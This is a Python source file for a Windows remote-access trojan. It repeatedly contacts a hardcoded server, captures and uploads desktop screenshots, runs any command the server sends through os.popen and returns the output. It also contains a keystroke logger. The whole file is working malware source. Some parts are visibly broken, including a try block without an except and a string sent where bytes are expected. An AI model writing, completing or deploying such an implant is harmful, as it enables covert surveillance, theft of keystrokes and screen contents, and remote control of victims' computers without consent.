import os
import win32gui
import win32ui
import win32con
import win32api
from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
import socket
import time
import urllib.request
import sys
#############
HOST = '192.168.109.137'  # The server's hostname or IP address
PORT = 9000        # The port used by the server
#############

def send_file(filename):
    
    csFT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    csFT.connect((HOST, 9898))
    text_file = filename
    with open(text_file, 'rb') as fs: 
    #Using with, no file close is necessary, 
    #with automatically handles file close
        csFT.send(b'BEGIN')
        while True:
            data = fs.read(1024)
            print('Sending data', data)
            csFT.send(data)
            print('Sent data', data)
            if not data:
                print('Breaking from sending data')
                break
        csFT.send(b'ENDED') # I used the same size of the BEGIN token
        fs.close()
        csFT.close()
    
    
    
#########################################################COMMAND#########################################################

def execuate_cmd(cmd):
    stream = os.popen(cmd)
    output = stream.read()
    return(output)

#########################################################COMMAND#########################################################



#########################################################SCREENSHOTS#########################################################

def screenshot_fn(filename):
    # grab a handle to the main desktop window
    hdesktop = win32gui.GetDesktopWindow()
    # determine the size of all monitors in pixels
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    # create a device context
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    # create a memory based device context
    mem_dc = img_dc.CreateCompatibleDC()
    # create a bitmap object
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    # copy the screen into our memory device context
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    # save the bitmap to a file
    screenshot.SaveBitmapFile(mem_dc, filename+'.bmp')
    # free our objects
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())
#########################################################SCREENSHOTS#########################################################

#########################################################KEYST#########################################################


user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None
def create_filename(filename):
    f = open(filename+".txt", "w")
    f.write("")
    f.close()

def get_current_process():

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # now read it's title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # print out the header if we're in the right process
    print
    #print ("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    print
  

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):
    
    global current_window   

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # if they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        print (chr(event.Ascii)),
    else:
        
        f = open("hi.txt", 'a')
        f.write("[%s]" % event.Key)
        f.close()
        print ("[%s]" % event.Key),

    # pass execution to next hook registered 
    return True

def stroking():
    
    kl         = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    kl.HookKeyboard()
    pythoncom.PumpMessages()
    
        
#########################################################KEYST#########################################################    



def main():
    print ('hi')
    while 1 :
        print('hi')
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        in_data = ''
        try:
            client.connect((HOST, PORT))
            client.send(b"hello")
            time.sleep(1)
            in_data =  client.recv(1024)
            print(in_data)
        except:
            pass
        if in_data == b"1":
            screenshot_fn("screenshot")
            print ('Taking Screenshot!')
            try:
                send_file("screenshot.bmp")
                print('sent!')
                try:
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect((HOST, PORT))
                    client.send('The Screenshot was sent, check it !')
            except:
                pass
        elif in_data == b"3" :
            pass
        else:
            client.close()
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((HOST, PORT))
                #client.send(bytes(execuate_cmd(str(in_data)[2:-1]), 'utf-8'))
                client.send(bytes(execuate_cmd(str(in_data)[2:-1]), 'utf-8'))
            except:
                pass
        time.sleep(2)
        client.close()
        time.sleep(2)

main()


